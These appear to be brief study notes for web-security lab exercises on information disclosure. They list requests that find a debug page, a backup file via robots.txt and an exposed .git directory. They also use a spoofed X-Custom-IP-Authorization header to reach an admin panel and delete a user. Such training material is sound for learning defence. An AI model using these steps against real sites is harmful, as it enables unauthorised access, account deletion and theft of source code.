# Information disclosure vulnerabilities

GET /product?productId="example"

GET /product?productId=2 HTTP/2 ⇒ <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> 
... /cgi-bin/phpinfo.php

https://.../   +  robots.txt
    User-agent: *
    Disallow: /backup

https://.../  +  /backup 
    https://.../backup/ProductTemplate.java.bak

GET /admin HTTP/2
Trace /admin HTTP/2
    X-Custom-IP-Authorization: 127.0.0.1
Get /admin/delete?username=carlos

https://..../  +  .git   ==>   Index of /.git
wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/   ==> 
cd YOUR-LAB-ID.web-security-academy.net
git log
git status
git show
